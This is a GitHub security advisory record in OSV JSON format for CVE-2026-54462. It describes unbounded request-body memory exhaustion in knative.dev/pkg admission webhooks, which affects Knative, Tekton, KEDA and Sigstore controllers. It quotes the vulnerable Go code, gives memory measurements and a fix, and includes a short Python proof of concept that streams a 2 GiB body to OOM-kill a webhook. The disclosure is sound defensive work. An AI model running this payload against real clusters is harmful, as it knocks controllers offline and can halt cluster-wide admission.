@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-2hw4-c9m4-f2fj",
+  "modified": "2026-10-28T21:30:03.882695907Z",
+  "published": "2026-10-28T21:20:53Z",
+  "aliases": [
+    "CVE-2026-54462"
+  ],
+  "summary": "knative.dev/pkg admission webhooks allow unbounded request-body memory exhaustion",
+  "details": "## ⚠️ Update (verification, 2026-05-19): C-2 confirmed end-to-end — **4.5× amplification observed** (worse than the advisory's conservative 2× claim)\n\nBuilt a Go PoC ([`cmd/poc-c2/main.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/cmd/poc-c2/main.go)) that runs the exact 8-line vulnerable snippet from [`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117) verbatim under the same `http.HandlerFunc` shape (the full production `admissionHandler` at `:85` requires `*Webhook` + `AdmissionController` + an informer-synced channel + controller-runtime / client-go scaffolding — the bug is the missing `http.MaxBytesReader`, nothing else in the handler). Bound to `127.0.0.1:18098`.\n\nPoC client streamed 2 GiB of `a` bytes over a raw TCP socket. `runtime.MemStats.HeapAlloc` sampler:\n\n```\nbaseline:  HeapAlloc =     0.32 MiB\npeak:      HeapAlloc = 9 217.38 MiB  =  9.00 GiB\nratio:     4.50× the body size\n```\n\nThe advisory predicted ~2× from `io.TeeReader` doubling the body once in `bodyBuffer`. The observed 4.5× ratio comes from the interaction of two amplifiers: `bytes.Buffer.ReadFrom` (used by `TeeReader`-fed `bodyBuffer`) doubles its backing slice on every grow, so peak occupancy during a realloc is `old + new = 3×` the live data — and `json.Decoder` holds its own working buffer in parallel. The advisory's 2× floor is comfortably exceeded.\n\n**Downstream impact reminder**: this library backs every Knative serving / eventing controller, every Tekton Triggers / Pipelines webhook, KEDA, Sigstore policy-controller, Kpack, and many more. A 2 GiB body to **any** of those projects' admission webhook ports OOMs the controller at 4.5× the body — i.e., even a 128 MiB request OOMs a 512 MiB-limited Pod.\n\n---\n\n# Summary\n\n`knative.dev/pkg`'s admission webhook handler reads the incoming HTTP request body via `json.NewDecoder(io.TeeReader(r.Body, \u0026bodyBuffer))` with **no `http.MaxBytesReader` wrapping the body**. Because every consumer of `knative.dev/pkg/webhook` inherits this handler (Knative serving / eventing, Tekton Pipelines, KEDA, Sigstore policy-controller, and others), a single oversized POST to **any of those projects' admission webhook ports** drives the controller pod into memory exhaustion and OOM-kill. Worse, the `io.TeeReader` design keeps a verbatim copy of the body in `bodyBuffer` while the decoder also materializes the parsed struct — so the peak memory usage is roughly **twice the body size**.\n\nThis is the same shape as **CVE-2026-24514** (ingress-nginx) and `GHSA-9539-c3xr-w9vm` (Kyverno admission body OOM) filed today against the same antipattern.\n\n# Affected versions\n\n- `knative.dev/pkg` — `main` HEAD on `github.com/knative/pkg` (verified 2026-05-18 against [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) sha `1ad5a1ce0ee7043081cb50fd1acc6d36a9126844`).\n- Every release that ships the current [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) handler.\n\n# Vulnerable code\n\n[`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117):\n\n```go\nreview := admissionv1.AdmissionReview{}\nvar bodyBuffer bytes.Buffer\nif err := json.NewDecoder(io.TeeReader(r.Body, \u0026bodyBuffer)).Decode(\u0026review); err != nil {\n    http.Error(w, fmt.Sprintf(\"could not decode body: %v\", err), http.StatusBadRequest)\n    return\n}\n```\n\nThere is no `http.MaxBytesReader` around `r.Body`. The standard library's `json.NewDecoder` will read until EOF or the matching closing `}`. The `io.TeeReader` simultaneously copies every byte read from `r.Body` into `bodyBuffer`, which the rest of the handler uses for the response trailer / observability.\n\n# Downstream impact (the reason this matters)\n\n`knative.dev/pkg/webhook` is the **default admission-webhook scaffolding for the entire Knative + CNCF webhook ecosystem**:\n\n| Consumer | Repo | Webhook surface |\n|---|---|---|\n| Knative serving | `knative/serving` | resource validation / defaulting |\n| Knative eventing | `knative/eventing` | resource validation / defaulting |\n| Tekton Pipelines | `tektoncd/pipeline` | Pipeline / Task / TaskRun validation |\n| Tekton Triggers | `tektoncd/triggers` | EventListener / Trigger validation |\n| KEDA | `kedacore/keda` | ScaledObject / ScaledJob validation |\n| Sigstore policy-controller | `sigstore/policy-controller` | ClusterImagePolicy mutating + validating |\n| Kpack | `buildpacks-community/kpack` | Image / Builder validation |\n| ... | | |\n\nEvery one of these consumers ships the same `io.ReadAll`-equivalent body read with **no upper bound**. A pod-network-reachable attacker can OOM-kill any of them with a single large POST. `failurePolicy=Fail` admission webhooks (the secure-default) then take the namespace's or cluster's admission flow offline until the controller restarts.\n\n# Impact\n\n- **Class**: CWE-770 unbounded allocation. Reachable from any pod-network client.\n- **Severity per consumer**: depends on how each consumer configures `failurePolicy`. For projects with `failurePolicy=Fail` (e.g., Sigstore policy-controller's image-policy enforcement), the consequence is cluster-wide admission outage. For `failurePolicy=Ignore`, the consequence is \"this project's webhook is offline\" but the API server continues admitting requests.\n- **Severity**: matches the broader CVE-2026-24514 / GHSA-9539-c3xr-w9vm. Single-packet DoS on the library; each downstream consumer inherits the bug.\n\n# Reproduction\n\nThe exact same PoC built against Kyverno's admission handler reproduces this:\n\n```python\nimport socket\ntotal = 2 \u003c\u003c 30   # 2 GiB\ns = socket.create_connection(('\u003cknative-or-tekton-webhook-host\u003e', 8443))\ns.sendall(b'POST /\u003cadmission-path\u003e HTTP/1.1\\r\\nHost: x\\r\\nContent-Type: application/json\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n' % total)\nchunk = b'a' * (1 \u003c\u003c 20)\nfor _ in range(total \u003e\u003e 20): s.sendall(chunk)\n```\n\nObserved against the Kyverno admission handler (same antipattern):\n\n```\nbaseline:        HeapAlloc=7 MiB     Sys=22 MiB\nafter read:      HeapAlloc=9500 MiB  Sys=9548 MiB  (4 GiB body → 9.5 GiB peak; io.TeeReader doubles)\n```\n\nFor the knative/pkg version, the `io.TeeReader` doubles the resident memory (one copy in the decoder's accumulating slice, one in `bodyBuffer`). A `kyverno-admission-controller`-equivalent Pod with a 256 MiB memory limit OOM-kills with ~128 MiB of body.\n\n# Suggested fix\n\nWrap the request body with `http.MaxBytesReader` (and add a `http.StatusRequestEntityTooLarge` branch on the `MaxBytesError` path):\n\n```go\nconst maxAdmissionRequestSize = 8 \u003c\u003c 20 // 8 MiB — controller-runtime's default; large enough for Kubernetes' own admission objects\nr.Body = http.MaxBytesReader(w, r.Body, maxAdmissionRequestSize)\nvar bodyBuffer bytes.Buffer\nreview := admissionv1.AdmissionReview{}\nif err := json.NewDecoder(io.TeeReader(r.Body, \u0026bodyBuffer)).Decode(\u0026review); err != nil {\n    var mbe *http.MaxBytesError\n    if errors.As(err, \u0026mbe) {\n        http.Error(w, \"admission body exceeds maximum size\", http.StatusRequestEntityTooLarge)\n        return\n    }\n    http.Error(w, fmt.Sprintf(\"could not decode body: %v\", err), http.StatusBadRequest)\n    return\n}\n```\n\nThis propagates a fix to **every downstream consumer** with no API change, and the cap can be made configurable per-server via a new field on the `webhook.Options` struct.\n\n# Disclosure\n\nReporting privately under your security policy. No public disclosure on my side until you have a fix or coordinated timeline. Encourage maintainers to coordinate with downstream consumers (Knative, Tekton, KEDA, Sigstore) on simultaneous release.\n\n# Reporter\n\ntonghuaroot (tonghuaroot@gmail.com)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "knative.dev/pkg",
+        "purl": "pkg:golang/knative.dev/pkg"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260531000007-52dbd5ece63f"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-2hw4-c9m4-f2fj/GHSA-2hw4-c9m4-f2fj.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/knative/pkg/security/advisories/GHSA-2hw4-c9m4-f2fj"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/knative/pkg/pull/3363"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/knative/pkg/commit/52dbd5ece63fe6d2d340ecbebec160550f460818"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/knative/pkg"
+    }
+  ]
+}
